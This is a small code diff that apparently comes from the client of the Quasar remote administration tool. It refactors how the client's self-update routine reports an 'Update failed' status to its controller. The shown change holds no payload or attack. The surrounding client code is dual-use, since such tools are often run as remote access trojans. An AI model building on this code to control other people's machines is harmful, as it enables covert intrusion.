@@ -1,4 +1,5 @@
-﻿using System;
+﻿using Quasar.Common.Packets;
+using System;
 using System.Diagnostics;
 using System.IO;
 using xClient.Config;
@@ -41,7 +42,7 @@ namespace xClient.Core.Installation
             catch (Exception ex)
             {
                 NativeMethods.DeleteFile(newFilePath);
-                new Packets.ClientPackets.SetStatus(string.Format("Update failed: {0}", ex.Message)).Execute(client);
+                client.Send(new SetStatus {Message = $"Update failed: {ex.Message}"});
             }
         }
     }
